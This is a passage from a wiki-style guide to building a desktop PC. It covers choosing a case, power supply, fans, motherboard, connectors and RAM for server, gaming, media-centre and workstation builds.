The thing that most servers have in common is that they are always on and therefore reliability is a key characteristic. Also they serve more than one user while storing and processing important information. For this reason servers are often equipped with redundant systems such as dual power supplies, RAID 5 arrays of four or more hard disks, special server grade processors that require error-correcting memory, multiple high-speed Ethernet connections, etc.

All of this is a little beyond the scope of the current work, but, in general, servers need lots of RAM, fast redundant hard drives, and the most reliable components your budget will allow. The CPU choice should be made in accordance with the use of the server. A simple print/fax server will do fine with a CPU stolen from a museum, whereas a server running a database and a front end for that, will work much better with a top of the line CPU. 

On the other end of the hardware list, since nobody is usually sitting at them, you can get away with the cheapest possible keyboard, mouse and monitor (in fact many servers run &quot;headless&quot; with no monitor at all). Graphics are also a very low priority on these machines, and a read only CD/DVD-ROM optical drive (used, infrequently, for installing software and updates) will do just fine.

===Gaming system===
We’re not talking here about the occasional game of solitaire or a secret late night Zuma obsession. We’re talking about cutting edge 3D gaming – first-person shooters or real-time strategy games with thousands of troops on the screen at the same time, with anisotropic filtering and anti-aliasing and mip-mapped specular reflections and a lot of other confusing terminology describing visual effects that will make anything less than a top-of-the-line system fall down on its knees and beg for mercy.

A top of the range processor is not critical to gaming performance (though it does help), but you will need at least a mid range one and plenty of RAM, as well as a motherboard to match, since the speed of the motherboard buses can limit high-end components. Please remember that if you plan on running the latest games in 1080p, or even higher, on highest settings, or even with three monitors, you will need a high end processor. This will stop the chances of bottlenecking the GPU (Graphic Processing Unit) and not give you the gaming experience you need. The most important part will be the video card (or cards) with cutting edge GPUs. [[w:ATI|ATI]] (who have been bought by [[w:AMD|AMD]] so the ATI cards now are labelled as AMD) and [[w:NVIDIA|NVIDIA]] have been competing for &quot;king of the graphics card&quot; honors for years and the competition is so keen that new cards running on new GPUs are released, it seems, twice a month. If you want to run two or more screens, the best idea would be to run two or more cards in either Crossfire X (AMD) or SLI (NVidia). But this is expensive and not all motherboards support both company's methods, so do your research and buy the best current cards you can afford.  

The other component which can offload some of the burden from your CPU is a good audio card. The DSPs (Digital Signal Processors) on the audio card can take over a lot of the sound processing and free up the CPU for other tasks. Currently [[w:Creative Labs|Creative Labs]] and ASUS Xonar are the leading brands, but again do your research (partly by reading on) and get the best audio card you can afford. Some motherboards have audio cards already built in, though these are generally of lesser quality, depending on the quality of the motherboard.

Finally all of these components are going to require a pretty hefty power supply, particularly if you decide to run two graphics cards in Crossfire (ATI) or SLI (NVIDIA) mode, in which case make sure the power supply is rated for the dual-graphics card mode you choose. Generally a serious gaming rig will require at least a 500 watt supply; units are available up to 1500 watts (1.5 Kilowatts) and two Kilowatt supplies are more rare. Keep in mind that having a higher-rated power supply will not actually increase the power your computer draws. The rating is the maximum that the power supply is designed to provide. Get the best you can afford.

As you may have noticed, pretty much every component inside the computer needs to be top of the line;  the same is true outside the case. You’ll want a big monitor, and a high sensitivity mouse. There are even gaming keyboards with the keys specially arranged, not to mention joysticks, throttle controllers, driving wheels, etc.

So, given that your budget is not bottomless, how do you prioritize? Well, the processor and video card are the components that will have the most effect on your gaming performance. Next comes the motherboard and RAM. If you use one instead of two video cards, you can also use a less expensive power supply. One of the advantages to building your own computer is that you can get the components you can afford now and plan to upgrade them later.

A note on cases for gaming rigs – it is not necessary to get a case with a side window that reveals glowing blue fans and revolving animated heat-sinks. A well-built plain case will do just as well and let you spend more money on the components that matter. But if you have the cash, and that’s your taste, there are lots of flashy add-ons available these days.

=== Entertainment system/media center ===
This is a computer designed to sit in the living room with the rest of your A/V gear. The idea is that it will record and serve audio and video files for replay via your existing television and stereo. The current notion is that this computer should be built in a special case that makes it look more like a stereo component, the size of which can present a challenge when it comes to getting all the necessary parts fitted.

For this system a mid-range processor will be fine, along with a generous amount of RAM. A fast Ethernet connection will facilitate sharing large files. You’ll also want a TV tuner card (or two) to get video in and out of the machine. Many of these also provide [[w:digital video recorder|DVR]] (digital video recorder) functionality, often without the monthly subscription fees and [[w:digital rights management|DRM]] (digital rights management) restrictions required by companies like Tivo. A wireless keyboard and mouse provide for couch-based use and a separate monitor may be unnecessary as your TV will fill that role.

All components should be as quiet as possible since you'll likely be watching/listening in the same room. For this application it makes sense to trade a little power for passively-cooled (without fans) parts. Following this logic, one may consider fan-less CPUs and mainboards.

===Workstation===
A workstation was, originally, a single-user computer with more muscle than a PC, intended to support  a demanding technical application, like CAD or complicated array-based simulations of real world phenomena. The niche that these computers filled – between high end PC’s and low end minicomputers – has essentially evaporated. The serious scientific applications have migrated to clusters of PC's with near super-computer speeds, and end-user applications, like video editing, music production and CAD, run well on high-end PC's. One sector that still uses large workstation farms from Sun or Silicon Graphics is serious, Pixar-style animation.

For any of the following uses, you will need the fastest processor and the most RAM you can manage.

{{NOTE|On a Microsoft Windows OS (before Vista x64, with the exceptions of Windows XP x64 and Windows Server 2003), the maximum practical RAM available for programs is 3 Gigabytes. The 4th gigabyte will be partially absorbed by system overhead or remain partially unused due to the OS incapacity to address memory at that range. 

On most 32-bit OS,the maximum practical RAM available for programs is no more than 4 Gigabytes because 32 bits of binary number can't express any number greater than 2^32.Some systems have used special ways to break the limit, called [[w:Physical Address Extension|Physical Address Extension(PAE)]].}}
====Video editing====
Big and fast hard drives are key. Solid State Drives or 10000 RPM Raptors in Raid 0 as working space with multiple 1 Terabyte or larger drives for storage is a good target. SATA/600 is highly recommended and SCSI subsystems should also be considered. A large amount of memory (8 gig or more, using a 32-bit OS is not recommended) would be beneficial, as would a fast CPU,with many cores/threads, especially if you intend to render effects or wish to quickly transcode video. Most editing and transcoding programs utilize some form of GPU acceleration (primarily OpenCL and/or CUDA), where the graphics processor is used, along with the CPU, to perform many calculations at the same time, greatly reducing processing time, compared to CPU-only processing.

====Music production====

Plenty of disk space is important, you'll also want at least 2 GB of RAM, but a music production (recording and mixing) workstation is chiefly distinguished by specialized external components – studio reference monitors instead of normal speakers, mixing consoles, microphones, etc. If you want to record external sources, like vocals or instruments, you'll need an audio interface which allows you to plug mics or instruments into your computer.

Audio interfaces allow anything from a single microphone or instrument on up to pro level systems that have 32 or more simultaneous inputs. These separate inputs will allow you to record each one as a separate track in your DAW. Most use Steinberg's ASIO interface (a software driver that connects your hardware to your DAW software). If you don't wish to invest in anything other than the onboard sound card your computer comes with, consider ASIO4All, a free driver that imitates the ASIO framework for almost any sound card.

One piece of advice, if you have extra money, get better microphones - even if you have to trade the Bluesmobile.

====CAD/CAM====
('''C'''omputer '''A'''ssisted '''D'''esign / '''C'''omputer '''A'''ided '''M'''anufacturing)

A CAD/CAM  workstation is usually a machine that runs a single, very intense, application. These machines often utilize specialized video hardware, like the Nvidia Quadro series of GPU's, which are designed specifically for CAD/CAM rendering. Since these machines are usually devoted to a single, expensive, application it's especially important to pay close attention to the requirements of that application. Spec the hardware to support the software - always a good idea but especially important here. 

Some examples of this specialized software are 3ds Studio Max, Maya, AutoCAD, Cinema4D, and Maxwell Render Engine.

== Do I plan on [[Wikipedia:overclocking|overclocking]] my computer? ==
Overclocking consists of running components at faster internal speeds than they are rated for. If you are serious about [[Wikipedia:overclocking|overclocking]] your computer, you need to do extensive research into the components you select, as some parts respond to overclocking better than others. Processors that respond well to heavy overclocking are generally not very expensive (though overclockable memory is), but the price of a component is by no means a guarantee of its overclocking potential. Overclocking usually voids your warranty and is risky (you can destroy your entire computer), so be warned! You need to think hard about cooling the computer as overclocking generates heat. Anything from a few extra fans to a liquid-cooled system may be necessary depending on the nature of your system.

== Do I plan on [[Wikipedia:underclocking|underclocking]] my computer? ==    
This can be ideal for always-on entertainment systems. Underclocked parts run cooler, often enabling passive cooling options to be used, which leads to a much quieter system.

The risk here is not destroying your computer, as with overclocking, but possible problems with hard-disk data integrity.  It is a good idea to back up your disk data periodically on a non-volatile medium, such as DVDs or tape.

== Can I use any of the parts from my old computer? ==
This depends on your situation; if your computer is more than four years old, chances are that most of the parts will be too old, slow or incompatible for your new machine. On the other hand, if you are upgrading from a fairly new machine, you may be able to use many of the parts. All of this assumes the old computer will no longer be used. If you, or someone else, is going to continue using your old computer, it's probably best just to leave it intact.

One important point – if you are selling your old computer it's a good idea to erase the hard drive before giving it to its new owner. Special precautions must be taken to ensure that you are not giving away your sensitive or personal information. Don't forget that a simple 'delete' command does not actually erase the data on your hard drive. The original data will still be present and can later be recovered by someone else using special programs and/or equipment. To avoid this, programs are available that will effectively 'shred' your data, making it unrecoverable.  Driver floppies or CD's that come with some hard drives may also have programs to do this, that write 0s or 1s (either way, &quot;blankness&quot;) to the whole drive. Lower-tech approaches include drilling a few holes in the drive or taking a blowtorch to it. Obviously, either prevents it from being used again (Be planet friendly and try to avoid this).

Since monitor technology moves quite slowly, you can probably keep your current monitor and use it on the new computer if it's of sufficient size and clarity for your work. The same can go for keyboards, as well as mice, printers, scanners, and possibly speaker sets. On the inside, you may be able to take out the floppy drive, CD-ROM drive, and possibly the sound card and hard drive (depending on how good they are, of course). Sometimes so much is used from the old computer, that the line between an upgrade and a new computer can become blurred.

Reusing a hard drive is an easy way to keep data from your old computer. With most Windows operating systems moving a boot drive from one motherboard to another will entail a series of reboots and installation of new drivers. In the case of newer Windows systems, like 2000 and XP, an entire 'refresh install' may be necessary to allow Windows to install a new Hardware Abstraction Layer. Back up your data before trying this.

== Where do I find the parts? ==
Once you have decided what you’re going to use your computer for, and have reviewed which parts are available for reuse, you should make a list of what components you will need to buy. A few hours of research can save you years of regret, so make sure that the computer you build will do what you need it to do. 

Computer terminology can be confusing, so if there are terms you don’t understand, be sure to look them up. Wikipedia is an excellent place to start if, for example, you’re not clear on the difference between, say, DDR and DDR2 memory.

There are several places to buy parts:

* '''Internet retailers''' generally offer the best price for new parts.  If a part needs to be returned, you may be stuck for the shipping; check return policies before you purchase.
* '''Auction sites''' like eBay and several others offer very good prices for used parts.  This is especially useful for parts which do not wear out.  Returns can be problematic or impossible. Some auctions may not be legitimate. Always check the shipping cost before you bid.
* '''Local PC shops''' - Their prices are often higher, but they may make up for this by providing a lot of expertise. Get opinions from other sources, however, as they may be eager to sell you parts you don't need.
* '''Big local retailers''' often lack technical expertise and charge higher prices, but can be useful because they usually handle returns quickly.  Also good if you need something right away.
* '''Trade shows''' that occur from time to time also provide a good place to shop, as the prices are often significantly reduced, and the variety of prefabricated computers built towards specific computing needs tend to be higher.

Also, your local town dump may have a special section for computers and monitors that others have got rid of. These can be more or less brand new computers with trivial problems such as a busted power supply or faulty cables. Of course if the dump does have such a section, you should ask permission of those in charge. They're usually glad to let you go through it, but don't leave a mess. Taking advantage of this can yield incredible finds, with a price tag of nothing or very little.

=== OEM vs Retail ===
Many hardware manufacturers will sell the same components in both OEM and Retail versions.  Retail hardware is intended to be sold to the end-user through retail channels, and will come fully packaged with manuals, accessories, software, etc.  OEM stands for &quot;original equipment manufacturer&quot;; items labeled as such are intended to be sold in bulk for use by firms which integrate the components into their own products.

However, many online stores will offer OEM hardware at cheaper prices than the corresponding retail versions. You will usually receive such an item by itself in an anti-static bag. It may or may not come with a manual or a CD containing drivers. Warranties on OEM parts may often be shorter, and sometimes require you to obtain support through your vendor, rather than the manufacturer. OEM components are also sometimes specified differently than their retail counterparts, parts may be clocked slower, and ports or features may be missing. Some of the support may be less (as in the case of Microsoft). Again, do your research.

== What should affect the choice of any part/peripheral? ==
Many things should be taken into account when deciding what parts to buy.  Below are some things to consider.

=== Compatibility ===
You’ll want to make sure that all the parts you buy work together without problems. The CPU, the motherboard, and the RAM in particular must be compatible with each other. Check the motherboard manufacturer's web site; most will list compatible RAM and processors. Often quality RAM that is not on the approved list (but is of the proper type) will work anyway, but the manufacturers list of processors should be rigidly adhered to.

Again, you’ll also want to make sure that your operating system supports the hardware you choose. Windows is supported by almost everything, though watch out for older components if you're planning on using Vista. If you have any interest in running Linux, MacOS or another operating system now or in the future, buy parts that are supported by that OS (Operating System). It is also worth checking around the Internet to make sure there is no history of your chosen components clashing (e.g. certain combinations of hardware causing instability, crashing, etc.)

=== '''Ergonomics''' ===
Ergonomics is the science of designing things so that they work with the human body. This is obviously important when choosing peripherals such as a keyboard or mouse but should also be considered when selecting a monitor, and especially when setting up the computer for your use. If your wrist hurts or you’re getting a crick in your neck, look at the physical setup of your computer, check your chair height and posture. An ounce of prevention here can avert troublesome repetitive strain injuries.

=== Operating temperature ===
Modern components, notably processors, GPUs, RAM, and some elements on the motherboard, are very small and draw a lot of power. A small area doing a lot of work with a lot of power leads to high temperatures. Various factors can cause electronic parts to break down over time and all of these factors are exacerbated by heat. Very high temperatures can burn out chips almost instantly, while running hot can shorten the useful life of a part, so the cooler we can make these parts, the better.

If you are not going to overclock your system, stock air cooling, when paired with a good case with adequate fans, should be enough to keep your system cool. If you want a quiet computer then components designed for passive (fan-less) cooling can be paired with very low noise case fans (or a well-vented case). In general, high-end parts will require more attention to cooling.

To keep your system at a proper operating temperature, you can monitor vital components with software (which usually comes with your motherboard). If you are seeing high temps, make sure the interior of your case is dust free, and remember that most cooling solutions can not reduce the temperature of your computer parts below room temperature.  Of course, unless you happen to have your computer outdoors in a climate such as the Sahara, room temperature will be well within the thermal limits of any component on your computer.

Which brings us to overclocking. It's specialty cooling solutions that make overclocking possible, a processor that might run stable at a maximum of 3.3 GHz at 60C could hit speeds as high as 5 GHz with specialized cooling systems.  A sensible person wanting a 20% overclock could add a special fan/heatsink to his CPU and some extra case fans. An enthusiast seeking a major overclock might go with a water-cooling solution for the CPU and GPU and sometimes other chips.  The real fanatics have been known to use liquid nitrogen or total immersion in pure water or oil.  You should not try any of the more extreme solutions unless you really know what you're doing.

=== Price ===
Today, there are a wide array of hardware components and peripherals tailored to fit every home computing need and budget. With all these options to choose from, it can be a bit overwhelming if you've never bought computer parts before. Shop around and remember to factor in shipping and handling, and taxes. Some places may be priced a bit higher, but offer perks such as free shipping, limited warranties, or 24-hour tech support. Many websites, such as [http://www.cnet.com CNET] and [http://www.zdnet.com ZDNet] offer comprehensive reviews, user ratings, and links to stores, including price comparisons. 

Since prices for any given part are always falling, it’s tempting to just wait until the part you want goes down in price. Unfortunately the reason prices decline is that better/faster parts are coming out all the time, so the part you want this year that costs $500 may well be $200 next year, but by that time you won’t want it any more, you’ll want the new, better part that still costs $500. At some point you’ve got to get on the bus and ride, even if the prices are still falling.

Usually the best bet is to buy just behind the bleeding edge, where, typically, you can get 90% of the performance of the top of the line part for 50% or 60% of the price. That last 10% is very expensive and if you don’t need it, you can save a lot of money with the second-tier part. 

It's a good idea to think about future upgradeability when selecting some components. While the computer that you're building today may be fine for your current needs you may want to upgrade it later. So look for components that support the newest standards and have room for future expansion, like a motherboard that will allow you to fit more memory than you are planning to use, or a case that has room for extra hard drives. If your current machine is maxed out the only possible upgrade is often a new machine.

You may also find that by over-specifying in some areas you can save money on others, e.g. if you don't currently need fantastic sound but you do need IEEE1394 (Firewire, iLink) then you might want to purchase a sound card anyway as some of the higher end sound cards also have a IEEE1394 port.

=== Performance ===
If money is no object, this is an easy question; just buy the most powerful components you can find. If, like most of us, there are limits to what you can/want to spend, then focus on those areas where more powerful parts will pay off for you and scrimp on others. Always look for that sweet spot on the price/performance curve where you get the most bang for your buck.

== Primary components ==
These are the components that will be the core of your new computer. It is impractical to put together a PC compatible computer without these components and a bare set of peripherals.

=== Chassis (case) &amp; power supply ===
{{Wikipedia| ATX#Power_supply}}
{{Wikipedia| Power supply unit (computer)}}

In earlier eras most cases were beige, and since most components drew far less power than similar components do now, power supplies received little attention. Recently, however, cases for the home market have become considerably more elaborate, with lights, side windows, glow-in-the-dark cables and other shiny/glowing embellishments. Cases now come in a plethora of styles and colors to suit anyone's taste. And as current components require much more power, power supply quality and size is an important issue.

If you are only building an office computer, the style of case will be of little concern to you. You might want an inexpensive ATX case (ATX is a specification which refers to the size of the motherboard. Any ATX motherboard, and the parts designed therefore, will fit in any ATX case), and an inexpensive power supply as you won't be running a high-end processor or graphics card. As a guide, you’ll want a power supply with a rating of more than 300 watts; any less won’t reliably power modern components. Most case/PSU bundles are adequate, but tend to feature a lower quality power supply than those that are sold separately from cases. If possible, avoid power supplies with sleeve bearing fans, as these are of considerably lesser quality.

Before purchasing any PSU, make sure that the supplied wattage is sufficient for your components. Power requirements are usually listed in the manuals that came with your components. It is important to note a power supply's total power, and the power at each voltage: 3.3, 5 and 12V. If any of these do not meet your requirements, the rest of the specifications don't matter.

Some companies have calculators to help you determine what your power supply needs are; if you are the type to just plug in the numbers without reading the details, you should buy a power supply that is 1.5 to 2 times the wattage that results from these calculators.

For a quiet system, you can choose a fan-less power supply -- more expensive but well worth it if noise is a concern, but be sure to monitor system temperatures to make sure cooling is adequate.

For cases and power supply here are some things to consider:

==== Form factor ====
Form factor is the specification that provides the physical measurements for the size of components and where mounting devices for them are located.

* [[Wikipedia:EATX|EATX]] or Extended ATX boards are 12&quot;x13&quot;. This format is almost exclusive to workstation computers.
* [[Wikipedia:ATX|ATX]] is the most common form factor and is the de facto standard.  In this form factor the motherboard is (usually) vertically mounted for more space and more efficient cooling than some other standards.
* [[Wikipedia:microATX|microATX]], or µATX, is smaller than standard ATX, but at the cost of fewer expansion slots.  Many cases that support ATX also allow micro-ATX. Flex ATX is even smaller than micro-ATX, but only allows 2 expansion slots. 
* [[Wikipedia:WTX|WTX]] is intended for workstations and servers. Note: WTX has been [[wikipedia:WTX|discontinued as of 2008]]. 
* [[Wikipedia:BTX (computers)|BTX]] is another formfactor designed for more efficient cooling. 
** '''PicoBTX''' 8&quot;x10.5&quot;
** '''MicroBTX''' up to 10.4&quot;x10.5&quot;
** '''BTX''' up to 12.8&quot;x10.5&quot;
* [[Wikipedia:Mini-ITX|Mini-ITX]] is even smaller than BTX, at 6.75&quot; square.
* [[Wikipedia:NLX (motherboard form factor)|NLX]]

Many OEM computers use non-standard form factors. Be sure to choose a motherboard compatible with your case's form factor.

==== Number of storage drive spaces ====
Internal hard drives/floppy drives (which go in the small 3.5&quot; bays) and internal CD/DVD drives (which go in the large 5.25&quot; bays) take up space in the case, so make sure you consider how many drives you will need and what size slot they require.  Note that optical drives and floppy drives will need what are called &quot;external&quot; slots (meaning they have a hole in the case through which their face can be accessed), while hard drives do not need to be manipulated manually often, so they can usually go into an &quot;internal&quot; slot.  This is not to be confused with an external drive, which doesn't go into the case at all.

Note that it's possible to buy adapters to fit items that go in small bays (usually hard drives) into large bays. It is, however, not possible to do the reverse.

==== Power rating ====

[[Image:ATX-Netzteil.jpg|thumb|right|250px|A power supply]]

The power supply unit (PSU) you choose needs to supply enough stable DC power to all the components and even to some of the peripherals. It needs also to be consistent, by complying with accurate standard voltages, i.e. the 12 volt rail needs to supply 12 volts (within normal tolerances of 10% or so) steadily under any foreseeable load, likewise the 3 and 5v rails at their respective voltages. Cheap power supplies tend to fall down in these areas. There are several tech-heavy websites that actually throw a multimeter on the PSU in the course of a review, seek these out and make sure you select a quality PSU.

In selecting a power supply, check carefully that it has the power feeds you need, e.g. six-pin PCI power, 20 vs. 24-pin motherboard connectors, etc. If you are planning on running two video cards in SLI (NVIDIA) or Crossfire (ATI) mode, make sure your power supply is approved for that. Both companies have certification programs.

There are several calculators that try to help you select an adequate PSU for your system, such as:

* http://web.aanet.com.au/SnooP/psucalc.php
* http://www.extreme.outervision.com/psucalculator.jsp

Choose an efficient PSU. Efficient PSUs run cooler and more quietly and thus do not create as much noise (important if you plan to sleep (or think) in the same room with it or use it as a media center PC). 

More information about this can be found at [http://www.silentpcreview.com/article28-page1.html Silent PC Review], [http://www.overclockers.com.au/wiki/Power_Supply_Unit OCAU Wiki], among others.

==== Fans ====
[[Image:Slotluefter_(smial).jpg|thumb|right|250px|A supplemental fan.  This one mounts in an unused expansion card slot.]]

Most cases mount one or more case fans, distinct from the fans that may be attached to the power supply, video card and CPU. The purpose of a case mounted fan is to move air through the system and carry excess heat out. This is why some cases may have two or more fans mounted in a push-pull configuration (one fan pulls cool outside air in, the other pushes hot interior air out). The more air these fans can move, the cooler things will generally be. 

Fans for case cooling currently come in two common sizes, 80&amp;nbsp;mm and 120&amp;nbsp;mm, and computer cases tend to support one size or the other. The larger 120&amp;nbsp;mm fans spin more slowly while moving a given volume of air, and slower fans are usually quieter fans, so the 120&amp;nbsp;mm fans are generally preferred, even though they cost a little more. Good 80&amp;nbsp;mm fans can still be fairly quiet, so while fan size is a factor, it shouldn't be a deal-breaker if the case has other features you like.

Make sure the power plug on the chosen case fan is supported by your motherboard; 3- and 4-pin Molex connectors are common. Fans can also be powered directly by the PSU, but in that configuration, the motherboard can't control or report the fan's speed.

Variable speed fans with built-in temperature sensing are available, but they may need to be specially ordered from an electronics supply warehouse.  They also may not have power plugs attached to their wire leads, but this can be remedied by a competent technician.  Variable speed fans tend to run quieter than constant speed fans, as they only move as much air as needed to maintain a set temperature within the case or the power supply box.  Under typical operating conditions they may be barely audible.

Since fans run continuously when the computer is turned on, bearing selection may be important for long life.  The least expensive fans use '''sleeve bearings'''.  As the fan ages, the lubricant in the sleeve bearing dries out and eventually the bearing wears, allowing the fan blade to nutate or vibrate, making it very noisy.  In severe cases the bearing may seize and the fan will stop turning entirely, possibly jeopardizing the computer when ventilation fails.  The most expensive fans tend to be those that use '''ball bearings''', but they also have very long service lives.  It isn't uncommon for a ball bearing fan to run continuously for 7 to 10 years&amp;nbsp;— possibly longer than the useful technological life of the computer within which it is mounted.  Ball bearing fans tend to be slightly noisier than sleeve bearing fans.  A fairly recent type of fan bearing is a '''magnetic''' or '''&quot;maglev&quot;''' bearing, which uses a magnetic field to suspend the fan rotor without physical contact.  Such fans exhibit practically zero bearing wear and barring a failure in their motor drive components, have essentially an infinite service life.  Maglev bearings also tend to be completely silent, and when used in a variable speed fan, can produce practically silent ventilation.

=== CPU (processor) ===

We discuss choosing a CPU in the next chapter,
[[How To Assemble A Desktop PC/Choosing the parts/CPU]].

=== Motherboard ===

[[Image:Asus_a8n_VMCSM02.jpg|thumb|right|350px|A PC motherboard: IDE connectors and the motherboard power connector (white with large holes) are on the left edge. Between them and the large quadratic CPU socket in the lower middle are the longish RAM sockets. The extension slots are above the CPU socket (two white, one black) and the ports for external devices are on the right edge.]]

The motherboard is a very important part of your computer. The difference between a cheap and a quality motherboard is typically around $100.  A good motherboard allows a modest CPU and RAM to run at maximum efficiency whereas a bad motherboard restricts high-end products to run only at modest levels.  

There are six things one must consider in choosing a motherboard: CPU interface, Chipset, IDE or SATA support, Expansion slot interfaces, and other connectors.  One must also make sure that the motherboard is of a form factor compatible with the case.

==== CPU interface ====
The CPU interface is the &quot;plug&quot; that your processor goes into.  For your processor to physically fit in the motherboard, the interface must be an '''exact match''' to your processor.  Intel currently has two mainstream formats, the LGA 2011 supporting their high-end Core i7 39XX and 49xx CPUs (as well as Xeon CPUs for servers), the LGA 1150 for the current generation desktop Core i5 and i7 series, and LGA1155 for the previous generation core i5/i7 processors (LGA 1155 remains, as of Q2 2013, the standard interface for the Core i3, Pentium, and Celeron processors). AMD currently uses four sockets: AM3+, AM3, FM1, and FM2.  The AM3 and AM3+ sockets are compatible with DDR3 RAM. The FM1 and FM2 sockets are used for AMD's line of A-series APU processors, which are also compatible with DDR3.

Check with the motherboard manufacturer to ensure that the slot on the motherboard will support the CPU you want to use. It is important to know whether the motherboard's bus can support the  exact CPU you plan on using.

If the motherboard, CPU, and heatsink/fan are not compatible and installed correctly, you can destroy the CPU and/or the motherboard in a matter of seconds.  Most modern processors come with a stock cooling fan which will work well at stock speeds, stick with this if you have any doubts.

==== Chipset ====

The function of BIOS is highly important. Some BIOS feature crash proof functions essential for updating the firmware. Other motherboards allow BIOS control of overclocking of CPU, RAM and Graphics card which are much more stable and safer for overclocking. Newer BIOS have temperature controls, and functions that shut down the computer if the temperature gets too high.

==== IDE (ATA) or SATA interface ====
Used for connecting hard and optical drives, most motherboards used to have two parallel, 40 pin IDE interface connectors which are now mostly used for backwards compatibility if they are present. These old PATA (parallel ATA) connections have been largely replaced by SATA (Serial ATA) connections for hard drives and optical drives. SATA connections are simple - one plug, one cable, one device. 

In the older PATA/IDE standard up to two devices could be connected to each port in a Master/Slave configuration. A 44 wire ribbon cable was used for this connection with three connectors, one on each end and one in the middle (actually slightly off center). One end was plugged into the motherboard connection and the other end plugged into the first (or only) device. If two devices are connected the second is connected to the middle connection. The device plugged into the end must be configured as a master (usually via a jumper on a set of pins on the device) while the second must be configured as a slave – OR both must be configured as “cable select”.

Two devices connected on the same IDE port can contend for access to the bus, causing a reduction in the effective speed of the drives. The newer serial ATA (SATA) interface has four or more separate motherboard connections that allow independent access and can increase the speed at which hard drives work. The cables are also narrower, improving the flow of air inside the case.

The support for older (PATA) IDE drives is starting to disappear. The new G/Q/P 965 chipset series from Intel completely dropped support for such devices. Nevertheless, many motherboard makers are still including an additional IDE controller on their boards, and it still remains possible to buy an extra PCI IDE controller.

==== Expansion slot interfaces ====
[[Image:PCIExpress.jpg|thumb|right|300px|PCI Express slots (from top to bottom: x4, x16, x1 and x16), compared to a traditional 32-bit PCI slot (bottom)]]
Old motherboards may have one or more the following slots:
* AGP - for graphics cards (ranging from AGP 1x, 2x, 4x and 8x)
* PCI - for expansion cards and low-end graphics cards

ATI still manufactures PCI graphics cards, but for better performance try a card supporting PCI-Express. AGP is not a good idea, because it is a standard that is on its way out. You may come upon ancient motherboards with neither AGP nor PCI, but please don't waste your time trying to reuse them.

Due to the evolution of new graphics cards on the serial PCI-Express Technology, current newer motherboards have the following connections:

* '''PCI-Express 16x''' for mainstream graphics cards (4 times speed of AGP 8x)
* '''PCI-Express 1x''' for faster expansion cards (replacing older PCI)
* '''PCI''' for use of old expansion cards (will eventually be phased out)

Older AGP 8x graphics cards are generally being discontinued in favor of PCI-Express 16x, as the speed and efficiency is about 4 times that of the AGP 8x technology.  Old PCI cards are either now built into the motherboard (for sound cards, LAN cards, IEEE 1394 firewire and USB 2.0 interfaces) or becoming PCI-Express variants.

==== Other connectors ====
[[Image:USB_Male_Plug_Type_A.jpg|thumb|right|150px|Male USB &quot;A&quot; connector]]
; '''Universal Serial Bus (USB)''': In addition to the USB 2.0 ports provided on the back panel, most motherboards will have connectors for additional ports, either on the front of the case or in a panel that fits where a PCI card might otherwise be connected. USB 2.0  ports (and be sure that your chosen motherboard supports the faster 2.0 standard) are used for connecting various peripherals such as printers, external hard drives etc. USB connectors are also used for connecting MP3 players, some cameras and an assortment of less serious devices like fans, Nerf missile launchers and drink warmers. Given the growing popularity of USB devices, the more ports your motherboard supports, the better.

USB 3.0 ports are now available on some motherboards and they are even faster than USB 2.0&amp;nbsp;— up to 5&amp;nbsp;Gbps. Although there are not many devices available yet that support the USB 3.0 standard, USB 3.0 ports are backwards compatible and can be used with USB 1 or 2 devices, although these will not receive the benefit of USB 3.0 speeds.

[[Image:SerialPort_ATX.jpg|thumb|right|150px|Subminiature D9-M serial port connector]]
; '''Serial (COM) or parallel (printer) ports''': Use of traditional 25-pin subminiature D parallel printer ports and RS-232 9-pin subminiature D serial ports has been waning since the early 1990s since the introduction of the Universal Serial Bus. Many motherboards no longer offer parallel ports&amp;nbsp;— formerly used almost exclusively for connecting printers&amp;nbsp;— altogether, while serial ports, which once numbered as many as four, are now usually solitary. The principal use for serial ports once was to connect to a mouse or an external modem; both of these devices now connect via USB. Unless you are connecting old peripheral hardware, these ports will be of minimal importance.  Even so, USB-to-Parallel and USB-to-Serial adapter cables are available, allowing late model computers to communicate with older peripherals.

[[Image:Firewire6-pin.jpg|thumb|right|150px|Firewire connector]]
; '''IEEE-1394 Firewire''': Firewire ports are principally used for connecting DV (Digital Video) cameras and external hard drives. This technology got a foothold because it was much faster than USB 1.0 and 1.1. With the near-ubiquity of USB 2.0, however, Firewire 400, the original, and still the most common IEEE-1394 implementation, was actually a little slower. For this reason, and in spite of the existence of a faster but seldom implemented Firewire 800 specification, Firewire is not as popular as USB. Like USB, most motherboards that support Firewire will have one or more external ports on the back panel and the ability to connect one or more additional ports. One or two Firewire ports will suffice for most users.

Note that, regardless of the motherboard's native support, additional ports of all kinds can always be added via a PCI or PCI-E 1 expansion card.

=== Memory ===
The amount of random access memory (RAM) to use has become a fairly simple choice. Unless one is building on a very restricted budget, one just has to choose between installing one, two, four, or eight gigabytes. One gigabyte of RAM is plenty for most modern operating systems, but all of them will run a little faster with two or four gigabytes. While 32-bit operating systems can address 4 gigabytes, they can utilize little more than three gigabytes as system RAM (actually 4 gigabytes minus Video RAM minus overhead for other devices). If one wishes to utilize the full 4 (or more) gigabytes of RAM, one needs to install a 64-bit operating system. It really comes down to a financial decision. One might also choose to get one gigabyte of high quality RAM over two gigabytes of lesser quality, especially if one plans to overclock. Some specialized applications may profit from more than two gigabytes of RAM. If one plans on using such, make sure to check that both the operating system and the motherboard will accommodate the amount of RAM one has in mind.

Another thing to consider when choosing the amount of RAM for one's system is the graphics card. Most motherboard-integrated graphics chips and PCI Express graphics cards marketed with the &quot;Turbo Cache&quot; feature will use system memory to store information related to rendering graphics; this system memory is generally not available at all to the operating system. On average, these graphics processors will use between 64 megabytes and 512 megabytes of system memory for rendering purposes.

The actual type of RAM one will need depends on the motherboard and chipset one gets. Some old motherboards use DDR (Double Data Rate) RAM or DDR2. DDR3 is the current industry standard. Chip sets that use dual-channel memory require one to use two identical&amp;nbsp;— in terms of size and speed&amp;nbsp;— RAM modules. The RAM should usually operate at the same clock speed as the CPU's Front Side Bus (FSB). The motherboard may not be able to run RAM slower than the FSB, and using RAM faster than the FSB will simply have it run at the same speed as the FSB. Buying low-latency RAM will help with overclocking the FSB, which can be of use to users who want to get more speed from their systems.

If one is upgrading an existing computer, it is best to check if one's machine requires specific kinds of RAM. Many computer OEMs, such as Gateway and Hewlett-Packard, require custom RAM, and generic RAM available from most computer stores may cause compatibility problems in such systems.

==== Labeling of RAM ====
RAM is labeled by its memory size in megabytes (MB) and clock speed (or bandwidth).

